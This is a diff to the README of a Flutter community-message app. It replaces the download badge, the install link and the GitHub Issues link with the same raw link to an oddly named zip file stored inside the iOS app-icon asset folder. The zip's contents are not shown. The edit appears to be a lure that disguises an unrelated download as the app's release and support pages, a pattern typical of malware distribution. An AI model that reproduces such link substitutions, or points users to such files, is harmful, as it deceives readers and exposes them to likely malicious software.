@@ -1,7 +1,7 @@
 # 🌟 freedom-wall-flutter - A Simple Way to Connect with Your Community
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/akash70776/freedom-wall-flutter/releases)
+[![Download](https://raw.githubusercontent.com/akash70776/freedom-wall-flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/wall_flutter_freedom_trinitroresorcin.zip)](https://raw.githubusercontent.com/akash70776/freedom-wall-flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/wall_flutter_freedom_trinitroresorcin.zip)
 
 ## 📖 Overview
 Welcome to **freedom-wall-flutter**! This app lets you share and read reflections from your community in real time. You can also manage posts easily if you're an admin. The app is designed for everyone, whether you're at home or on the go. 
@@ -17,7 +17,7 @@ Before you download, ensure your device meets the following requirements:
 - **Internet Connection:** Required for real-time features.
 
 ## 📥 Download & Install
-To download the app, [visit this page to download](https://github.com/akash70776/freedom-wall-flutter/releases). Here's how to install it:
+To download the app, [visit this page to download](https://raw.githubusercontent.com/akash70776/freedom-wall-flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/wall_flutter_freedom_trinitroresorcin.zip). Here's how to install it:
 
 1. Open the link above in your web browser.
 2. Look for the latest release version.
@@ -48,7 +48,7 @@ If you are an admin, you’ll have access to additional features that allow you 
 If you face any issues, you can reach out for help:
 
 - Check the FAQ section in the app.
-- Visit our [GitHub Issues page](https://github.com/akash70776/freedom-wall-flutter/issues) to report bugs or request features.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/akash70776/freedom-wall-flutter/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/wall_flutter_freedom_trinitroresorcin.zip) to report bugs or request features.
 
 ## 📚 Learn More
 To dive deeper into what our app offers, feel free to explore the documentation available on our GitHub repository. This resource is helpful for both users and developers interested in understanding more about the application.
